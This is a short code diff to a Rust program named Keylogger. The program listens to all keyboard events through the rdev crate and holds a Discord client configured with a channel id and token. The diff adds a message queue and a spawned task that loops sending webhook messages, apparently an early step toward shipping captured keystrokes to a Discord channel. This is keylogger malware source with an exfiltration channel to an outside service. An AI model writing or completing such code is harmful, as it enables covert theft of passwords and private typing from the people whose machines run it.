@@ -5,9 +5,11 @@ use discord::Discord;
 use config::Config;
 use rdev::{listen, Event, EventType};
 use async_std::task;
+use queues::{Queue, queue};
 
 pub struct Keylogger {
 	discord_client: Discord,
+	queue: Queue<String>,
 }
 
 impl Keylogger {
@@ -16,6 +18,7 @@ impl Keylogger {
 
 		return Keylogger {
 			discord_client: Discord::new(config.channel_id.as_str(), config.token.as_str()),
+			queue: queue![],
 		}
 	}
 
@@ -28,6 +31,12 @@ impl Keylogger {
 	        //println!("{:?}", event);
 	        //println!("{:?}", event.event_type);
 	        //println!("{:?}", event.name);
+
+	        task::spawn(async move {
+	        	loop {
+	            	discord_client.send_webhook("test");
+	        	}
+	        });
 
 	        match event.event_type {
 	            EventType::KeyPress(_key) => {
